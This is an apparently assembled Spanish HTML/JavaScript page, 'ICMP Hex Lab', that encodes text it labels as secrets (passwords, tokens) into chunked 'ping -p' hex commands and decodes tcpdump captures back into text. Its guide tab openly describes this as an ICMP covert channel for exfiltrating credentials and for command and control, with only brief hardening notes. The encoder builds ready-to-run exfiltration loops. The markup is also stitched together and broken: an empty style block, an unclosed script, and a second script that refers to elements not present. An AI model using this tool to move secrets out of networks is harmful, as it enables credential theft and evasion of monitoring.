<style>

<header class="hero">
  <div class="wrap">
    <div class="brand">
      <svg class="mark" viewBox="0 0 48 48" aria-hidden="true"><path d="M24 3l17 6v13c0 11-7.4 19.6-17 23C14.4 41.6 7 33 7 22V9z" fill="rgba(255,255,255,.16)" stroke="#fff" stroke-width="2"/><path d="M12 25h6l3-7 4 13 3-6h6" fill="none" stroke="#22d3ee" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <div>
        <p class="kicker">TECNOSYSLAN · Redes</p>
        <h1>ICMP Hex Lab</h1>
      </div>
    </div>
    <p class="lead">Constructor y decodificador de carga útil ICMP: transforma texto en el patrón hexadecimal de <code>ping -p</code> y recupera el texto a partir de una captura con <code>tcpdump</code>.</p>
    <p class="hero-note">Caso original: <code>ping -p 4b6579deadbeef0102030405 -c 1 192.168.1.10</code></p>
  </div>
</header>

<main class="wrap">
  <noscript><div class="card"><p class="msg err">Esta herramienta necesita JavaScript activado.</p></div></noscript>

  <nav class="tabs" role="tablist" aria-label="Modos de la herramienta">
    <button role="tab" id="tab-enc" class="tab active" aria-selected="true" aria-controls="p-enc">1 · Codificar</button>
    <button role="tab" id="tab-dec" class="tab" aria-selected="false" aria-controls="p-dec">2 · Decodificar</button>
    <button role="tab" id="tab-doc" class="tab" aria-selected="false" aria-controls="p-doc">3 · Recetario</button>
  </nav>

  <section id="p-enc" role="tabpanel" aria-labelledby="tab-enc" class="panel">
    <div class="card">
      <h2>Secreto a transportar</h2>
      <label for="txt">Texto (contraseña, token, ruta, fragmento de fichero)</label>
      <textarea id="txt" rows="3" maxlength="2048" placeholder="P@ssw0rd!"></textarea>
      <div class="row">
        <div>
          <label for="host">Host de destino</label>
          <input id="host" value="192.168.1.10" spellcheck="false" autocomplete="off">
        </div>
        <div>
          <label for="ivl">Intervalo entre paquetes (s)</label>
          <input id="ivl" type="number" value="0.5" min="0.2" max="60" step="0.1">
        </div>
        <div>
          <label for="mode">Formato de salida</label>
          <select id="mode">
            <option value="list">Comandos individuales</option>
            <option value="loop" selected>Bucle for (recomendado)</option>
            <option value="chain">Cadena con &amp;&amp;</option>
          </select>
        </div>
      </div>
      <div class="actions">
        <button class="btn" id="btnEnc" type="button">Codificar</button>
        <button class="btn ghost" id="btnCopyAll" type="button" disabled>Copiar comandos</button>
        <button class="btn ghost" id="btnClear" type="button">Limpiar</button>
      </div>
      <p class="msg" id="msgE" role="status" aria-live="polite"></p>
    </div>

    <div class="card" id="cardOut" hidden>
      <h2>Resultado</h2>
      <div class="stats" id="stats"></div>
      <p class="sub">Cada paquete transporta un bloque de 16 bytes. Envíalos en orden: el receptor debe recibirlos en secuencia.</p>
      <div id="list"></div>
      <p class="sub" style="margin-top:14px">Comandos generados</p>
      <pre id="cmd"></pre>
    </div>
  </section>

  <section id="p-dec" role="tabpanel" aria-labelledby="tab-dec" class="panel" hidden>
    <div class="card">
      <h2>Captura recibida</h2>
      <label for="inHex">Salida de tcpdump / xxd / hexdump</label>
      <textarea id="inHex" rows="8" spellcheck="false" placeholder="0x0010:  4b65 79de adbe ef01 0203 0405  Key............."></textarea>
      <div class="row">
        <div>
          <label for="skip">Bytes a saltar al inicio</label>
          <input id="skip" type="number" value="8" min="0" max="64" step="1">
        </div>
        <label class="check" for="dump"><input type="checkbox" id="dump" checked> Interpretar formato de volcado</label>
        <label class="check" for="strip"><input type="checkbox" id="strip" checked> Quitar caracteres de control</label>
      </div>
      <div class="actions">
        <button class="btn" id="btnDec" type="button">Decodificar</button>
        <button class="btn ghost" id="btnDemo" type="button">Cargar ejemplo</button>
      </div>
      <p class="msg" id="msgE2" role="status" aria-live="polite"></p>
    </div>

    <div class="card">
      <h2>Texto recuperado</h2>
      <pre class="out" id="res"></pre>
      <div class="actions">
        <button class="btn turq" id="btnCopyTxt" type="button">Copiar texto</button>
        <button class="btn ghost" id="btnClear2" type="button">Limpiar</button>
      </div>
      <p class="msg" id="msgD" role="status" aria-live="polite"></p>
    </div>
  </section>

  <section id="p-doc" role="tabpanel" aria-labelledby="tab-doc" class="panel doc" hidden>
    <div class="card">
      <h2>Qué hace exactamente ese comando</h2>
      <ul>
        <li><code>-p</code> rellena el payload ICMP con hasta <strong>16 bytes</strong> expresados en hexadecimal. No se envía texto: se envía binario.</li>
        <li><code>-c 1</code> limita a un único paquete por invocación, de modo que cada comando transporta un bloque de 16 bytes y el orden lo marca la secuencia de ejecución.</li>
        <li>El firewall del borde ve un eco ICMP permitido y corriente. La información viaja dentro de un protocolo que casi nadie inspecciona a fondo: es un <strong>canal encubierto</strong> (ICMP tunneling).</li>
      </ul>
      <h3>Por qué aparece en informes de intrusión</h3>
      <p class="sub">Sirve para exfiltrar credenciales, hashes o rutas cuando solo hay ICMP disponible, y también como canal de mando y control. Herramientas como ptunnel o icmpsh automatizan lo que aquí se construye a mano; el tamaño reducido de cada paquete obliga a fragmentar y a esperar entre envíos.</p>
      <h3>Capturar en el receptor</h3>
      <pre>sudo tcpdump -i any -n -s0 -XX 'icmp[icmptype]==8'</pre>
      <p class="sub">Copia la salida y pégala en la pestaña anterior. El salto por defecto de 8 bytes descarta la marca de tiempo que <code>ping</code> coloca al principio del payload.</p>
      <h3>Límites reales</h3>
      <ul>
        <li>16 bytes útiles por paquete: 2048 bytes son ya 128 paquetes.</li>
        <li>Con <code>-i</code> por debajo de 0,2 s <code>ping</code> exige privilegios de root.</li>
        <li>ICMP puede estar filtrado en el borde; si no hay eco, no hay canal.</li>
        <li>Sin cifrado ni integridad: hex o base64 no sustituyen a SSH.</li>
        <li>El <code>ping</code> nativo de Windows no admite patrón hexadecimal; usa WSL o una distro.</li>
      </ul>
      <h3>Endurecimiento</h3>
      <ul>
        <li>Limitar la tasa de ICMP en el router y registrar payloads anómalos.</li>
        <li>No asumir que «ICMP cerrado» equivale a canal cerrado: muchos equipos permiten eco hacia Internet.</li>
        <li>Vigilar volúmenes altos de eco con tamaño constante desde un mismo origen.</li>
      </ul>
    </div>
  </section>

  <footer>
    <p>Autopruebas de la herramienta: <strong id="tSum">ejecutando…</strong></p>
    <ul class="tests" id="tList"></ul>
  </footer>
</main>

<script>
(function(){
'use strict';
var $=function(id){return document.getElementById(id);};
var MAXB=2048, CH=16;
var RE4=/^(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)$/;
var REH=/^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?:\.(?!-)[A-Za-z0-9-]{1,63})*$/;
var hex2=function(b){return b.toString(16).padStart(2,'0');};
var toHex=function(bytes){return Array.from(bytes,hex2).join('');};
var hexToBytes=function(h){var m=h.match(/../g)||[];return new Uint8Array(m.map(function(x){return parseInt(x,16);}));};

function msg(el,text,kind){el.textContent=text;el.className='msg'+(kind?' '+kind:'');}

function copy(text,el){
  if(!text){msg(el,'No hay nada que copiar.','warn');return;}
  var done=function(ok){
    if(ok){msg(el,'Copiado al portapapeles.','ok');}
    else{msg(el,'Copia manual: selecciona el texto y usa Ctrl+C.','warn');}
  };
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(text).then(function(){done(true);},function(){fallback();});
  }else{fallback();}
  function fallback(){
    var ta=document.createElement('textarea');
    ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
    document.body.appendChild(ta);ta.select();
    var ok=false;
    try{ok=document.execCommand('copy');}catch(e){ok=false;}
    ta.remove();done(ok);
  }
}

var tabs=Array.prototype.slice.call(document.querySelectorAll('.tab'));
tabs.forEach(function(t){
  t.addEventListener('click',function(){
    tabs.forEach(function(o){
      o.classList.toggle('active',o===t);
      o.setAttribute('aria-selected',o===t?'true':'false');
    });
    ['enc','dec','doc'].forEach(function(k){$('p-'+k).hidden=('tab-'+k)!==t.id;});
  });
});

var lastCmd='';

function encode(){
  var out=$('cardOut'),list=$('list'),stats=$('stats'),pre=$('cmd');
  list.textContent='';stats.textContent='';pre.textContent='';out.hidden=true;
  lastCmd='';$('btnCopyAll').disabled=true;

  var text=$('txt').value;
  if(!text){msg($('msgE'),'Escribe el texto que quieres transportar.','err');$('txt').focus();return;}

  var host=$('host').value.trim();
  if(!host){msg($('msgE'),'Indica un host de destino.','err');$('host').focus();return;}
  if(!RE4.test(host)&&!REH.test(host)){msg($('msgE'),'Host no válido: usa IPv4 (192.168.1.10) o nombre DNS (servidor.local).','err');$('host').focus();return;}

  var ivl=parseFloat($('ivl').value);
  if(!isFinite(ivl)||ivl<=0){msg($('msgE'),'El intervalo debe ser un número mayor que 0.','err');return;}
  if(ivl>60){msg($('msgE'),'El intervalo máximo admitido es 60 s.','err');return;}

  var bytes=new TextEncoder().encode(text);
  if(bytes.length>MAXB){msg($('msgE'),'Demasiado texto: '+bytes.length+' bytes (máximo '+MAXB+').','err');return;}

  var chunks=[];
  for(var i=0;i<bytes.length;i+=CH){chunks.push(toHex(bytes.subarray(i,i+CH)));}

  var warns=[];
  if(/[^\x20-\x7E]/.test(text)){warns.push('Hay caracteres fuera de ASCII imprimible: viajan en UTF-8 y los acentos ocupan 2 bytes.');}
  if(ivl<0.2){warns.push('Por debajo de 0,2 s ping necesita root.');}
  if(chunks.length>1){warns.push(chunks.length+' paquetes: el orden solo se conserva si se ejecutan en secuencia.');}

  var ivlTxt=String(ivl), mode=$('mode').value, cmd='';
  if(mode==='list'){
    cmd=chunks.map(function(h){return 'ping -p '+h+' -c 1 '+host;}).join('\n');
  }else if(mode==='chain'){
    cmd=chunks.map(function(h){return 'ping -p '+h+' -c 1 '+host+' >/dev/null';}).join(' && sleep '+ivlTxt+' &&\n');
  }else{
    cmd='for p in \\\n'+chunks.join(' \\\n')+' \\\n; do\n  ping -p "$p" -c 1 '+host+' >/dev/null\n  sleep '+ivlTxt+'\ndone';
  }

  var dur=((chunks.length-1)*ivl)+(chunks.length*0.002);
  function stat(k,v){
    var d=document.createElement('div');d.className='stat';
    var s=document.createElement('span');s.textContent=k;
    var b=document.createElement('b');b.textContent=v;
    d.appendChild(s);d.appendChild(b);return d;
  }
  stats.appendChild(stat('Bytes',String(bytes.length)));
  stats.appendChild(stat('Paquetes',String(chunks.length)));
  stats.appendChild(stat('Duración estimada',dur.toFixed(1)+' s'));
  stats.appendChild(stat('Máximo por paquete','16 bytes'));

  chunks.forEach(function(h,idx){
    var row=document.createElement('div');row.className='chunk';
    var n=document.createElement('span');n.className='idx';n.textContent='#'+(idx+1);
    var code=document.createElement('code');code.textContent=h;
    var btn=document.createElement('button');
    btn.type='button';btn.className='mini';btn.textContent='Copiar';
    btn.addEventListener('click',function(){copy('ping -p '+h+' -c 1 '+host,$('msgE'));});
    row.appendChild(n);row.appendChild(code);row.appendChild(btn);
    list.appendChild(row);
  });

  pre.textContent=cmd;
  lastCmd=cmd;
  $('btnCopyAll').disabled=false;
  out.hidden=false;

  if(warns.length){msg($('msgE'),warns.join(' '),'warn');}
  else{msg($('msgE'),'Listo: '+chunks.length+' paquete(s) preparados para '+host+'.','ok');}
}

function extractHex(raw,dumpMode){
  var out=[];
  raw.split(/\r?\n/).forEach(function(line){
    if(!line.trim()){return;}
    if(dumpMode){
      var m=line.match(/^\s*(?:0x)?[0-9a-fA-F]{4,8}:\s*((?:[0-9a-fA-F]{2,4}\s+)*[0-9a-fA-F]{2,4})/);
      if(m){
        var g=m[1].replace(/\s+/g,'');
        if(g.length>32){g=g.slice(0,32);}
        out.push(g);return;
      }
    }
    var only=line.match(/[0-9a-fA-F]/g);
    if(only){out.push(only.join(''));}
  });
  return out.join('');
}

function decode(){
  var res=$('res');
  res.textContent='';
  var raw=$('inHex').value;
  if(!raw.trim()){msg($('msgD'),'Pega la salida de tcpdump o una cadena hexadecimal.','err');$('inHex').focus();return;}

  var hex=extractHex(raw,$('dump').checked);
  if(!hex){msg($('msgD'),'No se han encontrado bytes hexadecimales en la entrada.','err');return;}
  if(hex.length%2!==0){msg($('msgD'),'Número impar de dígitos hexadecimales ('+hex.length+'): revisa la captura o desactiva el modo volcado.','err');return;}

  var skip=parseInt($('skip').value,10);
  if(!isFinite(skip)||skip<0){skip=0;}
  if(skip*2>=hex.length){msg($('msgD'),'El salto de '+skip+' bytes consume toda la entrada.','err');return;}

  var body=hex.slice(skip*2);
  var bytes=hexToBytes(body);
  var text='',bad=false;
  try{text=new TextDecoder('utf-8',{fatal:true}).decode(bytes);}
  catch(e){bad=true;text=new TextDecoder('utf-8').decode(bytes);}

  if($('strip').checked){
    text=text.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g,'');
  }

  if(!text){msg($('msgD'),'Los bytes leídos ('+bytes.length+') no producen texto legible. Prueba a ajustar el salto.','warn');return;}
  res.textContent=text;

  if(bad){msg($('msgD'),bytes.length+' bytes decodificados; había secuencias UTF-8 no válidas y se han sustituido.','warn');}
  else{msg($('msgD'),bytes.length+' bytes decodificados correctamente.','ok');}
}

<script>
(function(){
'use strict';
var tpl=document.getElementById('src');

function build(){
  var html=tpl.innerHTML;
  var end=html.indexOf('</style>');
  var css='',body=html;
  if(end>-1){css=html.slice(0,end+8);body=html.slice(end+8);}
  return '<!DOCTYPE html>\n<html lang="es">\n<head>\n<meta charset="utf-8">\n'
    +'<meta name="viewport" content="width=device-width, initial-scale=1">\n'
    +'<title>ICMP Hex Lab \u00b7 TECNOSYSLAN</title>\n'
    +'<meta name="description" content="Constructor y decodificador de carga \u00fatil ICMP en hexadecimal para ping -p y tcpdump. Herramienta de redes de TECNOSYSLAN.">\n'
    +'<meta name="color-scheme" content="light">\n'
    +css+'\n</head>\n<body>\n'+body+'\n</body>\n</html>\n';
}

var TABLE=(function(){
  var t=new Uint32Array(256);
  for(var n=0;n<256;n++){
    var c=n;
    for(var k=0;k<8;k++){c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1);}
    t[n]=c>>>0;
  }
  return t;
})();

function crc32(bytes){
  var c=0xFFFFFFFF;
  for(var i=0;i<bytes.length;i++){c=TABLE[(c^bytes[i])&0xFF]^(c>>>8);}
  return (c^0xFFFFFFFF)>>>0;
}

function makeZip(name,data){
  var nb=new TextEncoder().encode(name);
  var crc=crc32(data);
  var lh=new Uint8Array(30+nb.length),dv=new DataView(lh.buffer);
  dv.setUint32(0,0x04034b50,true);
  dv.setUint16(4,20,true);
  dv.setUint16(6,0x0800,true);
  dv.setUint16(8,0,true);
  dv.setUint16(10,0,true);
  dv.setUint16(12,0x21,true);
  dv.setUint32(14,crc,true);
  dv.setUint32(18,data.length,true);
  dv.setUint32(22,data.length,true);
  dv.setUint16(26,nb.length,true);
  dv.setUint16(28,0,true);
  lh.set(nb,30);

  var cd=new Uint8Array(46+nb.length),dvc=new DataView(cd.buffer);
  dvc.setUint32(0,0x02014b50,true);
  dvc.setUint16(4,20,true);
  dvc.setUint16(6,20,true);
  dvc.setUint16(8,0x0800,true);
  dvc.setUint16(10,0,true);
  dvc.setUint16(12,0,true);
  dvc.setUint16(14,0x21,true);
  dvc.setUint32(16,crc,true);
  dvc.setUint32(20,data.length,true);
  dvc.setUint32(24,data.length,true);
  dvc.setUint16(28,nb.length,true);
  dvc.setUint32(42,0,true);
  cd.set(nb,46);

  var eocd=new Uint8Array(22),dve=new DataView(eocd.buffer);
  dve.setUint32(0,0x06054b50,true);
  dve.setUint16(8,1,true);
  dve.setUint16(10,1,true);
  dve.setUint32(12,cd.length,true);
  dve.setUint32(16,lh.length+data.length,true);

  var out=new Uint8Array(lh.length+data.length+cd.length+eocd.length),o=0;
  out.set(lh,o);o+=lh.length;
  out.set(data,o);o+=data.length;
  out.set(cd,o);o+=cd.length;
  out.set(eocd,o);
  return out;
}

var src=build();
var bytes=new TextEncoder().encode(src);
document.getElementById('frame').srcdoc=src;

var box=document.getElementById('checks');
var items=[
  ['Contiene index.html',true],

  ['Sin rutas absolutas',!/\b(?:src|href)="\//.test(src)],
  ['Sin recursos externos',!/https?:\/\/[^"'\s]+\.(?:js|css)/.test(src)],
  ['Sin credenciales ni tokens',!/api[_-]?key\s*[:=]/i.test(src)],
  ['index.html v\u00e1lido',src.indexOf('<!DOCTYPE html>')===0&&src.indexOf('</html>')>-1]
];
var ul=document.createElement('ul');
items.forEach(function(it){
  var li=document.createElement('li');
  li.textContent=it[0];
  if(!it[1]){li.className='bad';}
  ul.appendChild(li);
});
box.textContent='Comprobaciones previas:';
box.appendChild(ul);

document.getElementById('btnZip').addEventListener('click',function(){
  var zip=makeZip('index.html',bytes);
  var blob=new Blob([zip],{type:'application/zip'});
  var url=URL.createObjectURL(blob);
  var a=document.createElement('a');
  a.href=url;
  a.download='tecnosyslan-icmp-hex-lab.zip';
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(function(){URL.revokeObjectURL(url);},5000);
});
})();
</script>
</body>
